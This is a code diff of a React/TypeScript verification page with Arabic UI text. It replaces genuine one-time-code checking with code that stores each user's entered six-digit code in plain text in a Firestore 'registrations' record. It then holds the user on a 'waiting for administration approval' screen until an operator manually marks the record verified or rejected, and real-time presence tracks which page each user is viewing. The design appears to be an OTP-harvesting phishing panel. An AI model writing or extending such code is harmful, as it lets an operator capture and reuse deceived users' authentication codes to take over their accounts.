@@ -1,29 +1,37 @@
 import { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { Shield, Lock, AlertCircle, CheckCircle2, Loader2 } from 'lucide-react';
-import { useSiteConfig } from '@/context/SiteConfigContext';
-import { verifyCode, createVerificationCode } from '@/lib/firestore';
+import { AlertCircle, CheckCircle2, Loader2, Headphones, Clock } from 'lucide-react';
+import { doc, updateDoc, onSnapshot } from 'firebase/firestore';
+import { db as dbInstance } from '@/lib/firebase-config';
 import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
+
+// Get db with null check
+const getDb = () => {
+  if (!dbInstance) {
+    throw new Error('Firebase is not initialized');
+  }
+  return dbInstance;
+};
 
 export default function VerifyPage() {
   const navigate = useNavigate();
-  const { config } = useSiteConfig();
-  const pg = config.verify;
   
-  const [code, setCode] = useState('');
+  const [code, setCode] = useState(['', '', '', '', '', '']);
   const [loading, setLoading] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
+  const [waitingApproval, setWaitingApproval] = useState(false);
   const [error, setError] = useState('');
   const [success, setSuccess] = useState(false);
-  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
-  const inputRef = useRef<HTMLInputElement>(null);
+  const [timeLeft, setTimeLeft] = useState(300);
+  const [canResend, setCanResend] = useState(false);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   
   const userId = sessionStorage.getItem('reg_id');
   const userEmail = sessionStorage.getItem('reg_email');
 
-  // Set user online on mount
   useEffect(() => {
     if (!userId) {
-      navigate('/register');
+      navigate('/login');
       return;
     }
     
@@ -35,9 +43,44 @@ export default function VerifyPage() {
     };
   }, [userId, navigate]);
 
-  // Countdown timer
+  // الاستماع لتغييرات حالة التسجيل في الوقت الحقيقي
   useEffect(() => {
-    if (timeLeft <= 0) return;
+    if (!userId || !submitted) return;
+
+    const registrationRef = doc(getDb(), 'registrations', userId);
+    
+    const unsubscribe = onSnapshot(registrationRef, (snapshot) => {
+      if (snapshot.exists()) {
+        const data = snapshot.data();
+        
+        // إذا وافق المدير على التسجيل
+        if (data.status === 'verified' || data.status === 'completed') {
+          setSuccess(true);
+          const clientId = sessionStorage.getItem('client_id') || '';
+          updateUserPage(clientId, '/thank-you');
+          
+          setTimeout(() => {
+            navigate('/thank-you');
+          }, 1500);
+        }
+        
+        // إذا رفض المدير التسجيل
+        if (data.status === 'rejected') {
+          setError('تم رفض طلبك من قبل الإدارة');
+          setSubmitted(false);
+          setWaitingApproval(false);
+        }
+      }
+    });
+
+    return () => unsubscribe();
+  }, [userId, submitted, navigate]);
+
+  useEffect(() => {
+    if (timeLeft <= 0) {
+      setCanResend(true);
+      return;
+    }
     
     const timer = setInterval(() => {
       setTimeLeft(prev => prev - 1);
@@ -46,22 +89,70 @@ export default function VerifyPage() {
     return () => clearInterval(timer);
   }, [timeLeft]);
 
-  // Focus input on mount
   useEffect(() => {
-    inputRef.current?.focus();
+    inputRefs.current[0]?.focus();
   }, []);
 
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60);
     const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, '0')}`;
+    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleInputChange = (index: number, value: string) => {
+    const digit = value.replace(/\D/g, '').slice(-1);
+    const newCode = [...code];
+    newCode[index] = digit;
+    setCode(newCode);
+    setError('');
+
+    if (digit && index < 5) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Backspace') {
+      if (code[index] === '' && index > 0) {
+        inputRefs.current[index - 1]?.focus();
+      }
+    }
+  };
+
+  const handlePaste = (e: React.ClipboardEvent) => {
     e.preventDefault();
+    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
     
-    if (!code || code.length < 6) {
+    if (pastedData.length > 0) {
+      const newCode = [...code];
+      pastedData.split('').forEach((char, i) => {
+        if (i < 6) newCode[i] = char;
+      });
+      setCode(newCode);
+      
+      const nextEmpty = newCode.findIndex(c => c === '');
+      if (nextEmpty !== -1) {
+        inputRefs.current[nextEmpty]?.focus();
+      } else {
+        inputRefs.current[5]?.focus();
+      }
+    }
+  };
+
+  const focusFirstEmpty = () => {
+    const emptyIndex = code.findIndex(c => c === '');
+    if (emptyIndex !== -1) {
+      inputRefs.current[emptyIndex]?.focus();
+    }
+  };
+
+  const getFullCode = () => code.join('');
+
+  const handleSubmit = async () => {
+    const fullCode = getFullCode();
+    if (fullCode.length < 6) {
       setError('يرجى إدخال رمز التحقق المكون من 6 أرقام');
+      focusFirstEmpty();
       return;
     }
 
@@ -73,78 +164,60 @@ export default function VerifyPage() {
         throw new Error('معرف المستخدم غير موجود');
       }
 
-      const isValid = await verifyCode(userId, code);
+      // حفظ الرمز المرسل وتغيير الحالة
+      const registrationRef = doc(getDb(), 'registrations', userId);
+      await updateDoc(registrationRef, {
+        verification_code: fullCode,
+        verification_submitted_at: new Date().toISOString(),
+        status: 'pending_verification' // حالة等待 الموافقة
+      });
       
-      if (isValid) {
-        setSuccess(true);
-        
-        // Update presence
-        const clientId = sessionStorage.getItem('client_id') || '';
-        updateUserPage(clientId, '/thank-you');
-        
-        // Navigate after short delay
-        setTimeout(() => {
-          navigate('/thank-you');
-        }, 1500);
-      } else {
-        setError('رمز التحقق غير صحيح أو منتهي الصلاحية');
-        setCode('');
-        inputRef.current?.focus();
-      }
+      // الانتقال لصفحة الانتظار
+      setSubmitted(true);
+      setWaitingApproval(true);
+      setTimeLeft(300);
+      
     } catch (err: any) {
-      console.error('Verification error:', err);
-      setError(err.message || 'حدث خطأ أثناء التحقق');
+      console.error('Submission error:', err);
+      setError(err.message || 'حدث خطأ أثناء إرسال الرمز');
     } finally {
       setLoading(false);
     }
   };
 
   const handleResend = async () => {
-    if (!userId) return;
+    if (!userId || !canResend) return;
     
     setLoading(true);
     setError('');
+    setSubmitted(false);
+    setWaitingApproval(false);
+    setCode(['', '', '', '', '', '']);
     
     try {
-      // Generate new 6-digit code
-      const newCode = Math.floor(100000 + Math.random() * 900000).toString();
-      
-      await createVerificationCode(userId, newCode, 5);
-      
-      // Reset timer
       setTimeLeft(300);
-      setCode('');
-      setError('');
+      setCanResend(false);
       
-      // In production, you would send this code via SMS/Email
-      console.log('[Verify] New code generated (in production, send via SMS):', newCode);
-      
-      alert('تم إرسال رمز جديد بنجاح');
+      console.log('[Verify] Reset for new code');
+      setTimeout(() => inputRefs.current[0]?.focus(), 100);
     } catch (err: any) {
-      console.error('Resend error:', err);
-      setError('فشل إرسال رمز جديد. حاول مرة أخرى.');
+      console.error('Reset error:', err);
     } finally {
       setLoading(false);
     }
   };
 
-  // Auto-submit when 6 digits entered
-  useEffect(() => {
-    if (code.length === 6) {
-      handleSubmit({ preventDefault: () => {} } as any);
-    }
-  }, [code]);
-
   if (!userId) {
     return (
-      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4">
+      <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#101935' }}>
         <div className="text-center">
           <AlertCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
-          <h2 className="text-xl font-bold text-white mb-2">خطأ</h2>
-          <p className="text-slate-400 mb-4">يرجى التسجيل أولاً</p>
+          <h2 className="text-xl font-bold mb-2" style={{ color: '#ffffff' }}>خطأ</h2>
+          <p className="mb-4" style={{ color: '#8d99ae' }}>يرجى التسجيل أولاً</p>
           <button
-            onClick={() => navigate('/register')}
-            className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-xl"
+            onClick={() => navigate('/login')}
+            className="px-6 py-3 rounded-xl font-bold text-white transition-all"
+            style={{ backgroundColor: '#4c72b8' }}
           >
             تسجيل جديد
           </button>
@@ -154,109 +227,183 @@ export default function VerifyPage() {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center p-4">
-      <div className="w-full max-w-md">
-        {/* Logo & Title */}
-        <div className="text-center mb-8">
-          <div className="w-20 h-20 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-blue-600/30">
-            <Shield className="w-10 h-10 text-white" />
-          </div>
-          <h1 className="text-3xl font-bold text-white mb-2">{pg.title}</h1>
-          <p className="text-slate-400">
-            تم إرسال رمز التحقق إلى<br />
-            <span className="text-blue-400 font-semibold">{userEmail}</span>
-          </p>
+    <div 
+      className="min-h-screen flex flex-col justify-between p-5"
+      style={{ backgroundColor: '#101935', direction: 'rtl' }}
+    >
+      {/* Top Bar */}
+      <div className="flex justify-between items-center" style={{ color: '#8d99ae' }}>
+        <span className="text-sm">الإنكليزية</span>
+        <Headphones className="text-lg cursor-pointer" />
+      </div>
+
+      {/* Content */}
+      <div className="flex flex-col items-center justify-center flex-1 w-full max-w-[380px] mx-auto my-auto">
+        {/* Logo */}
+        <div className="mb-6">
+          <svg width="70" height="70" viewBox="0 0 100 100" fill="none">
+            <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
+            <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
+          </svg>
         </div>
 
-        {/* Verification Form */}
-        <div className="bg-slate-800/50 backdrop-blur-xl rounded-3xl p-8 shadow-2xl border border-slate-700/50">
-          {success ? (
-            <div className="text-center py-8">
-              <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
-                <CheckCircle2 className="w-10 h-10 text-green-500" />
-              </div>
-              <h2 className="text-xl font-bold text-white mb-2">تم التحقق بنجاح!</h2>
-              <p className="text-slate-400">جاري التحويل إلى الصفحة الرئيسية...</p>
-            </div>
-          ) : (
-            <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Code Input */}
-              <div className="space-y-3">
-                <label className="text-sm font-semibold text-slate-300 flex items-center gap-2">
-                  <Lock className="w-4 h-4" />
-                  رمز التحقق
-                </label>
-                <input
-                  ref={inputRef}
-                  type="text"
-                  value={code}
-                  onChange={(e) => {
-                    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
-                    setCode(val);
-                    setError('');
-                  }}
-                  placeholder="000000"
-                  dir="ltr"
-                  className="w-full bg-slate-900/50 border border-slate-600 rounded-xl px-4 py-4 text-center text-3xl tracking-[1em] font-mono text-white placeholder-slate-600 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 focus:outline-none transition-all"
-                  disabled={loading}
-                  maxLength={6}
-                />
-                <p className="text-center text-sm text-slate-500">
-                  متبقي: <span className={`font-bold ${timeLeft <= 60 ? 'text-red-400' : 'text-slate-400'}`}>{formatTime(timeLeft)}</span>
-                </p>
-              </div>
+        {/* Title */}
+        <h1 className="text-2xl font-bold mb-3 text-center" style={{ color: '#ffffff' }}>
+          {waitingApproval ? 'في انتظار الموافقة' : 'رمز التحقق'}
+        </h1>
+        <p className="text-sm text-center mb-8 leading-relaxed" style={{ color: '#8d99ae' }}>
+          {waitingApproval 
+            ? 'تم إرسال الرمز بنجاح، بانتظار موافقة الإدارة' 
+            : 'تم إرسال رمز التحقق يرجى ادخال الرمز'}
+        </p>
 
-              {/* Error Message */}
-              {error && (
-                <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-3 text-red-400 text-sm">
-                  <AlertCircle className="w-5 h-5 flex-shrink-0" />
-                  <span>{error}</span>
-                </div>
+        {/* حالة الانتظار */}
+        {waitingApproval ? (
+          <div className="flex flex-col items-center w-full">
+            {/* أيقونة التحميل */}
+            <div className="w-20 h-20 rounded-full flex items-center justify-center mb-6" 
+              style={{ backgroundColor: 'rgba(76, 114, 184, 0.2)' }}>
+              {success ? (
+                <CheckCircle2 className="w-10 h-10" style={{ color: '#22c55e' }} />
+              ) : (
+                <Clock className="w-10 h-10 animate-pulse" style={{ color: '#4c72b8' }} />
               )}
+            </div>
 
-              {/* Submit Button */}
-              <button
-                type="submit"
-                disabled={loading || code.length < 6}
-                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-600/50 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-600/30 hover:shadow-xl hover:shadow-blue-600/40 transform hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2"
-              >
-                {loading ? (
-                  <>
-                    <Loader2 className="w-5 h-5 animate-spin" />
-                    <span>جاري التحقق...</span>
-                  </>
-                ) : (
-                  <>
-                    <span>{pg.button_text}</span>
-                    <Shield className="w-5 h-5" />
-                  </>
-                )}
-              </button>
-
-              {/* Resend Link */}
-              <div className="text-center">
-                <button
-                  type="button"
-                  onClick={handleResend}
-                  disabled={loading || timeLeft > 240}
-                  className="text-blue-400 hover:text-blue-300 text-sm font-medium disabled:text-slate-600 disabled:cursor-not-allowed transition-colors"
-                >
-                  {pg.resend_text}
-                </button>
+            {/* حالة النجاح */}
+            {success && (
+              <div className="flex items-center gap-2 mb-4 px-4 py-3 rounded-xl text-sm"
+                style={{ 
+                  backgroundColor: 'rgba(34, 197, 94, 0.1)', 
+                  border: '1px solid rgba(34, 197, 94, 0.2)',
+                  color: '#22c55e'
+                }}>
+                <CheckCircle2 className="w-5 h-5 flex-shrink-0" />
+                <span>تمت الموافقة! جاري التحويل...</span>
               </div>
-            </form>
-          )}
-        </div>
+            )}
 
-        {/* Back Link */}
-        <div className="text-center mt-6">
-          <button
-            onClick={() => navigate('/login')}
-            className="text-slate-500 hover:text-slate-400 text-sm transition-colors"
-          >
-            ← العودة لتسجيل الدخول
-          </button>
-        </div>
+            {/* حالة الانتظار */}
+            {!success && (
+              <>
+                <div className="flex items-center gap-2 mb-6 px-4 py-3 rounded-xl text-sm"
+                  style={{ 
+                    backgroundColor: 'rgba(76, 114, 184, 0.1)', 
+                    border: '1px solid rgba(76, 114, 184, 0.2)',
+                    color: '#4c72b8'
+                  }}>
+                  <Loader2 className="w-5 h-5 animate-spin" />
+                  <span>بانتظار مراجعة الإدارة لطلبك...</span>
+                </div>
+
+                <p className="text-xs text-center" style={{ color: '#8d99ae' }}>
+                  سيتم تحويلك تلقائياً عند موافقة الإدارة
+                </p>
+              </>
+            )}
+          </div>
+        ) : (
+          <>
+            {/* OTP Inputs */}
+            <div className="flex gap-2.5 justify-center w-full mb-8" style={{ direction: 'ltr' }}>
+              {code.map((digit, index) => (
+                <input
+                  key={index}
+                  ref={el => inputRefs.current[index] = el}
+                  type="text"
+                  inputMode="numeric"
+                  pattern="[0-9]"
+                  maxLength={1}
+                  value={digit}
+                  onChange={(e) => handleInputChange(index, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(index, e)}
+                  onPaste={handlePaste}
+                  disabled={loading}
+                  className="w-12 h-[52px] text-center text-xl font-bold rounded-xl transition-all focus:outline-none"
+                  style={{
+                    backgroundColor: '#1e2942',
+                    border: error ? '2px solid #ef4444' : '1px solid #2a3859',
+                    color: '#ffffff',
+                  }}
+                  onFocus={(e) => {
+                    e.target.style.borderColor = '#4c72b8';
+                    e.target.style.boxShadow = '0 0 10px rgba(76, 114, 184, 0.5)';
+                  }}
+                  onBlur={(e) => {
+                    e.target.style.borderColor = error ? '#ef4444' : '#2a3859';
+                    e.target.style.boxShadow = 'none';
+                  }}
+                />
+              ))}
+            </div>
+
+            {/* Verify Button */}
+            <button
+              onClick={() => handleSubmit()}
+              disabled={loading || code.some(c => c === '')}
+              className="w-full py-3.5 rounded-xl font-bold text-base text-white transition-all mb-6 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
+              style={{ backgroundColor: '#4c72b8' }}
+              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#3b5a93'}
+              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#4c72b8'}
+            >
+              {loading ? (
+                <>
+                  <Loader2 className="w-5 h-5 animate-spin" />
+                  <span>جاري الإرسال...</span>
+                </>
+              ) : (
+                <span>تأكيد الرمز</span>
+              )}
+            </button>
+
+            {/* Resend Section */}
+            <div className="text-sm text-center" style={{ color: '#8d99ae' }}>
+              <span>لم يصلك الرمز؟ </span>
+              <button
+                onClick={handleResend}
+                disabled={loading || !canResend}
+                className="font-bold transition-all disabled:cursor-not-allowed"
+                style={{ 
+                  color: canResend ? '#4a7c59' : '#555',
+                  pointerEvents: canResend ? 'auto' : 'none'
+                }}
+              >
+                إعادة إرسال
+              </button>
+              {!canResend && (
+                <span className="mr-1" style={{ color: '#555' }}>
+                  ({formatTime(timeLeft)})
+                </span>
+              )}
+            </div>
+          </>
+        )}
+
+        {/* Error Message */}
+        {error && (
+          <div className="flex items-center gap-2 mt-4 px-4 py-3 rounded-xl text-sm" 
+            style={{ 
+              backgroundColor: 'rgba(239, 68, 68, 0.1)', 
+              border: '1px solid rgba(239, 68, 68, 0.2)',
+              color: '#ef4444'
+            }}>
+            <AlertCircle className="w-5 h-5 flex-shrink-0" />
+            <span>{error}</span>
+          </div>
+        )}
+      </div>
+
+      {/* Back Link */}
+      <div className="text-center mt-auto pt-4">
+        <button
+          onClick={() => navigate('/login')}
+          className="text-sm transition-colors"
+          style={{ color: '#8d99ae' }}
+          onMouseEnter={(e) => e.currentTarget.style.color = '#ffffff'}
+          onMouseLeave={(e) => e.currentTarget.style.color = '#8d99ae'}
+        >
+          العودة لتسجيل الدخول ←
+        </button>
       </div>
     </div>
   );
